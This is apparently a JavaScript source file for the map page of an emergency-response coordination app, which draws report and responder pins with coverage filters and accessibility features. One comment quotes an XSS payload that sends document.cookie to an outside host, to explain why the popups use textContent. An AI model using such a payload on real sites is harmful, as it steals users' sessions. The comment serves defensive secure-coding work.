// The service worker used to be registered from this file, back when tiles
// were the only thing it kept. It now runs the whole offline story, so it
// lives in pwa.js and loads on every page — registering it only here meant
// somebody who installed the app from the board had no offline support until
// they happened to open the map.

// Katy, TX. Only ever seen if there are no located reports at all.
const FALLBACK = [29.7858,-95.8244];

const map = L.map("map").setView(FALLBACK,11);

const reports = JSON.parse(
    document.getElementById("reports-data").textContent
);

L.tileLayer(
"https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png",
{
    attribution:"© OpenStreetMap"
}
).addTo(map);

let high=0;
let medium=0;
let low=0;

const markers=[];

// Report pins. A subject is whatever the person who filed it typed, so this
// is built out of text nodes for the same reason the responder popup below
// is — see the long comment there. Every pin on this map has one of these,
// which makes it the widest version of that hole rather than the narrowest.
function reportPopup(report){

    const box=document.createElement("div");

    const title=document.createElement("strong");
    title.textContent=report.subject;

    const priority=document.createElement("div");
    priority.textContent=report.priority;

    const link=document.createElement("a");
    // Number() rather than the raw value: this is the one field that ends up
    // in a URL, and an id of "javascript:..." should not survive the trip.
    link.setAttribute("href","/report/"+Number(report.id));
    link.textContent="Open Report";

    box.append(title,document.createElement("br"),priority,link);
    return box;
}

// How covered a report is, from the counts the server already computes.
//
// This is the same judgement the feed makes when it sorts, drawn on a map
// instead. "Nobody going" is not "understaffed" — it means not one person has
// said they are coming, which is the failure the whole project exists to make
// visible. Seeing it as a red pin two streets from a green one is the entire
// argument in a single glance.
function coverage(report){
    if(report.on_scene_count > 0) return "there";
    if(report.en_route_count > 0) return "coming";
    return "nobody";
}

// A div rather than Leaflet's default image pin, so the state is a CSS class
// and the uncovered ones can pulse. Reports stay teardrops and responders
// stay circles — one shape for an incident, another for a person.
function reportPin(state){
    return L.divIcon({
        // Empty rather than absent: Leaflet's default is leaflet-div-icon,
        // which draws a white box behind everything.
        className: "",
        html: `<span class="pin pin-${state}"></span>`,
        iconSize: [22, 22],
        // 27, not 22. The pin is a 22px square rotated 45 degrees, so its
        // visible tip is half a diagonal below the centre — 11 + 15.6 — and
        // anchoring to the box bottom left every pin sitting about five
        // pixels north of the thing it points at.
        iconAnchor: [11, 27],
        popupAnchor: [0, -25],
    });
}

let uncovered = 0;

reports.forEach(report=>{

    if(report.priority==="HIGH") high++;
    if(report.priority==="MEDIUM") medium++;
    if(report.priority==="LOW") low++;

    const state = coverage(report);
    if(state === "nobody") uncovered++;

    const marker=L.marker([report.latitude,report.longitude],
                          {icon: reportPin(state)})
    .addTo(map)
    .bindPopup(reportPopup(report));

    marker.subject=report.subject.toLowerCase();
    marker.coverage=state;

    markers.push(marker);

});

// Show only the reports nobody has committed to.
//
// Hiding the covered ones is not a filter for tidiness — it is the question
// a coordinator actually has. Everything left on the screen is somewhere no
// help is on the way to.
const gapsOnly = document.getElementById("gaps-only");

if(gapsOnly){

    gapsOnly.textContent = uncovered === 1
        ? "Only the 1 nobody is going to"
        : `Only the ${uncovered} nobody is going to`;

    if(!uncovered){
        // Every report has somebody. Say so rather than offering a button
        // that would empty the map.
        gapsOnly.textContent = "Everything has somebody going";
        gapsOnly.disabled = true;
    }

    gapsOnly.addEventListener("click", ()=>{
        const on = gapsOnly.getAttribute("aria-pressed") !== "true";
        gapsOnly.setAttribute("aria-pressed", on ? "true" : "false");
        gapsOnly.classList.toggle("on", on);
        applyFilters();
    });
}

// The newest report is the one you opened the map to look at, so it goes in
// the middle. Then push the edges out far enough that everything else still
// fits — mirroring the furthest pin keeps the newest one dead centre instead
// of letting fitBounds drift towards wherever the crowd is.
if(reports.length){

    const newest=[...reports].sort(
        (a,b)=>b.created_at.localeCompare(a.created_at)
    )[0];

    const centre=[newest.latitude,newest.longitude];

    let reach=0;

    reports.forEach(report=>{
        reach=Math.max(
            reach,
            Math.abs(report.latitude-centre[0]),
            Math.abs(report.longitude-centre[1])
        );
    });

    if(reach===0){
        map.setView(centre,14);
    }else{
        map.fitBounds([
            [centre[0]-reach,centre[1]-reach],
            [centre[0]+reach,centre[1]+reach],
        ],{padding:[40,40]});
    }

}

document.getElementById("high").textContent=high;
document.getElementById("medium").textContent=medium;
document.getElementById("low").textContent=low;

// Both filters run through here.
//
// They used to be independent, and typing in the search box put back every
// pin the coverage toggle had just hidden — each one undoing the other,
// silently, so the map showed something neither filter had been asked for.
let search = "";

function applyFilters(){

    const gapsOn = gapsOnly
        && gapsOnly.getAttribute("aria-pressed") === "true";

    markers.forEach(marker=>{

        const matches = marker.subject.includes(search);
        const covered = gapsOn && marker.coverage !== "nobody";

        if(matches && !covered) marker.addTo(map);
        else map.removeLayer(marker);

    });
}

// --- finding your way back -----------------------------------------------
//
// The map opens wherever it opens, and one stray scroll puts you over an
// ocean with no way back except reloading. Reports are the only thing on
// here worth looking at, so both buttons are about getting you to them:
// one shows all of them, the other walks through them one at a time.

const fitBtn = document.getElementById("fit-all");
const nextBtn = document.getElementById("next-incident");
let cursor = -1;

function shown(){
    return markers.filter(m => map.hasLayer(m));
}

function fitAll(){
    const visible = shown();
    if(!visible.length) return;

    map.fitBounds(
        L.latLngBounds(visible.map(m => m.getLatLng())),
        { padding: [50, 50], maxZoom: 15 }
    );
    cursor = -1;
    announce(`Showing all ${visible.length} reports.`);
}

function nextIncident(){
    const visible = shown();
    if(!visible.length) return;

    cursor = (cursor + 1) % visible.length;
    const marker = visible[cursor];

    map.setView(marker.getLatLng(), 16);
    marker.openPopup();
    announce(`Report ${cursor + 1} of ${visible.length}.`);
}

// Moving the map is invisible to somebody using a screen reader, so say
// where we went. Polite: it must not interrupt anything being read.
function announce(message){
    let region = document.getElementById("map-said");
    if(!region){
        region = document.createElement("p");
        region.id = "map-said";
        region.className = "visually-hidden";
        region.setAttribute("role", "status");
        region.setAttribute("aria-live", "polite");
        document.body.appendChild(region);
    }
    region.textContent = message;
}

if(fitBtn) fitBtn.addEventListener("click", fitAll);
if(nextBtn) nextBtn.addEventListener("click", nextIncident);

document.getElementById("search")
.addEventListener("input",e=>{
    search = e.target.value.toLowerCase();
    applyFilters();
});

function getResponderColor(state){

    switch(state){

        case "overdue":
            return "#f38ba8";

        case "on_scene":
            return "#a6e3a1";

        case "en_route":
            return "#89b4fa";

        case "available":
            return "#a6adc8";

        default:
            return "#cdd6f4";
    }

}

function formatState(state){

    switch(state){

        case "on_scene":
            return "On Scene";

        case "en_route":
            return "En Route";

        case "overdue":
            return "Overdue";

        case "available":
            return "Available";

        default:
            return state;
    }

}

// Built out of DOM nodes rather than an HTML string, deliberately.
//
// A report subject is free text typed by whoever filed the report, and it
// reaches this line exactly as they typed it. Dropped into innerHTML, a
// subject of
//
//     <img src=x onerror="fetch('https://elsewhere/'+document.cookie)">
//
// runs in the browser of every coordinator who opens this pin — and the
// people opening these pins are the ones with the session worth stealing.
//
// Usernames happen to be safe today: signup restricts them to
// [A-Za-z0-9._-]. But a line is not secure because of a rule enforced four
// hundred lines away in another file, and that rule only has to be relaxed
// once. textContent cannot be talked into executing anything, so it does
// all of the work here.
function responderPopup(responder) {

    const box = document.createElement("div");

    const name = document.createElement("strong");
    name.textContent = responder.username;
    box.append(name, document.createElement("br"));

    // The template literals below are safe because the result becomes a
    // text node. It is never parsed as markup.
    const add = (text) => box.append(document.createTextNode(text),
                                     document.createElement("br"));

    add(`Status: ${formatState(responder.state)}`);

    add(responder.assignment
        ? `Assignment: ${responder.assignment.report_subject}`
        : "Available");

    add(`Last check-in: ${new Date(responder.last_position.at).toLocaleString()}`);

    return box;
}

fetch("/api/responders")
    .then(res => {
        // fetch only rejects on a network failure. A 500 or a redirect to the
        // login page resolves normally, and .json() then throws a parse error
        // on the HTML — same banner, but nothing anywhere says which of the
        // three happened. Reading the status is the difference between "no
        // signal" and "the server is broken", and only one of those is fixed
        // by moving somewhere with bars.
        if (!res.ok) throw new Error(`/api/responders returned ${res.status}`);
        return res.json();
    })
    .then(responders => {

        responders.forEach(responder => {

            if (!responder.last_position) return;

            const { lat, lng } = responder.last_position;

            // A hollow ring, because the legend says so and because colour
            // is already spoken for. Red, blue and green on a teardrop mean
            // whether anyone is coming to a place; the same three on a filled
            // circle meant a person, and the two were indistinguishable at a
            // glance. Shape carries person-or-place, colour carries state,
            // and neither has to do both.
            const marker = L.circleMarker([lat, lng], {
                radius: 9,
                color: getResponderColor(responder.state),
                fillColor: getResponderColor(responder.state),
                fillOpacity: 0.15,
                weight: 3
            }).addTo(map);

            marker.bindPopup(responderPopup(responder));

        });

    })
    // The reports on this map came from the server with the page. The
    // responder pins are a second request, and it is the one that fails
    // when the network is bad — which is when somebody is most likely to
    // be staring at this screen. Failing quietly leaves a map that looks
    // complete and is missing every responder on it, so say so.
    .catch(err => {
        console.warn("responder positions unavailable:", err);

        const warning = document.createElement("div");
        warning.className = "map-warning";
        warning.setAttribute("role", "status");
        warning.textContent =
            "Could not load responder positions. Reports are still shown.";

        // Above the map, not at the end of the document. Appending to body put
        // it below the statistics cards, off the bottom of a phone screen —
        // the map looked complete, was missing every responder, and the notice
        // saying so was somewhere you had to scroll to find.
        const canvas = document.getElementById("map");
        if (canvas && canvas.parentNode) {
            canvas.parentNode.insertBefore(warning, canvas);
        } else {
            document.body.appendChild(warning);
        }
    });